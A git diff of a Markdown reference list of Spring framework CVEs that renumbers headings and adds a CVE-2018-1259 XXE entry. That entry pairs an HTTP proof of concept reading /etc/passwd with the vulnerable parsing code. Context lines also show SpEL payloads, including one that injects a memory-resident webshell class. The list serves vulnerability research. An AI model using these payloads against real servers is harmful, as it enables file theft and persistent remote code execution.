@@ -1,7 +1,7 @@
 # SpringSecurity
 A list for Spring Security
 
-## Spring Cloud Function
+## （1）Spring Cloud Function
 ### CVE-2022-22979 DoS
 Affected Version: < 3.2.6  
 Ref: https://checkmarx.com/blog/spring-function-cloud-dos-cve-2022-22979-and-unintended-function-invocation/  
@@ -83,7 +83,7 @@ T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("
 #{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
 ```
 
-## Spring Cloud Gateway
+## （2）Spring Cloud Gateway
 ### CVE-2022-22947 RCE
 Affected Version: < 3.1.1 or < 3.0.7  
 Ref: https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/  
@@ -193,7 +193,37 @@ static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, Str
     return value;
 }
 ```
-## Spring Data Commons
+## （3）Spring Data Commons
+### CVE-2018-1259 XXE
+Affected Version: < 1.13.12 or < 2.0.7 + XMLBeam <= 1.4.14   
+Diff: https://github.com/SvenEwald/xmlbeam/commit/f8e943f44961c14cf1316deb56280f7878702ee1  
+POC:
+```
+POST / HTTP/1.1
+Content-Type: application/xml;charset=UTF-8
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<user>
+	<firstname>&xxe;</firstname>
+	<lastname>axisx</lastname>
+</user>
+```
+Factor: 
+```
+org.xmlbeam.io.StreamInput
+private Document readDocument() throws IOException {
+    try {
+        DocumentBuilder documentBuilder = this.projector.config().createDocumentBuilder();
+        Document document = this.systemID == null ? documentBuilder.parse(this.is) : documentBuilder.parse(this.is, this.systemID);
+        return document;
+    } ...
+}
+```
+
 ### CVE-2018-1273 SpEL
 Affected Version: < 1.13.11 or < 2.0.6  
 Diff: https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a  
@@ -224,7 +254,7 @@ public void setPropertyValue(String propertyName, @Nullable Object value) throws
     }
 }
 ```
-## Spring Data Rest
+## （4）Spring Data Rest
 ### CVE-2017-8046 SpEL
 Affected Version: < 2.5.12 or 2.6.7 or 3.0 RC3  
 Diff: https://github.com/spring-projects/spring-data-rest/commit/8f269e28fe8038a6c60f31a1c36cfda04795ab45  
@@ -249,7 +279,7 @@ protected void setValueOnTarget(Object target, Object value) {
     this.spelExpression.setValue(target, value);
 }
 ```
-## Spring Security OAuth2
+## （5）Spring Security OAuth2
 ### CVE-2016-4977 SpEL
 Affected Version: < 2.0.0-2.0.9 or 1.0.0-1.0.5  
 Diff: https://github.com/spring-attic/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d  
@@ -298,7 +328,7 @@ org.springframework.security.oauth2.provider.endpoin.SpelView
     }
 ```
 
-## Spring Cloud Netflix Hystrix Dashboard + Spring Boot Thymeleaf
+## （6）Spring Cloud Netflix Hystrix Dashboard + Spring Boot Thymeleaf
 ### CVE-2021-22053 SpEL
 Affected Version: < 2.2.9.RELEASE   
 POC: 
@@ -325,7 +355,7 @@ static IStandardExpression parseExpression(IExpressionContext context, String in
     String preprocessedInput = preprocess ? StandardExpressionPreprocessor.preprocess(context, input) : input;
 }
 ```
-## Spring Boot Actuator Logview
+## （7）Spring Boot Actuator Logview
 ### CVE-2021-21234 Directory Traversal 
 Affected Version: < 0.2.13  
 POC: 
@@ -339,7 +369,7 @@ public void streamContent(Path folder, String filename, OutputStream stream) thr
     IOUtils.copy(new FileInputStream(this.getFile(folder, filename)), stream);
 }
 ```
-## Spring Framework
+## （8）Spring Framework
 ### CVE-2018-1270 RCE
 Affected Version: < 5.0.5 or 4.3.15  
 Diff: https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#   
